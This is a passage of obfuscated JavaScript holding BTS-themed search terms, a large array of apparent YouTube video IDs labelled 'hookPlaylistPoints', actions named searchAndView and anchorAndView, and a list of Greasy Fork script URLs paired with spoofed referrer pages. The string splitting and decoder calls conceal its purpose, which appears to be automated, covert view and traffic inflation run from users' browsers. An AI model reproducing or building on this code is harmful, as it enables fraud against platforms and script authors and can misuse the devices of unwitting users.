+ -0x21ba)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + Y(0x19, 'l)Vl') + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0xac1 + -0xd0 * 0x20 + -0x16a * -0x1a);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    Y(0x7, 'l)Vl') + 'U',
    Y(0x17, 'B^g1') + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    Y(0x14, '#Rnz') + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    Z(0x1a) + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + Z(0x5) + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Z(0x9) + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x4) + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + a0(0xb) + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
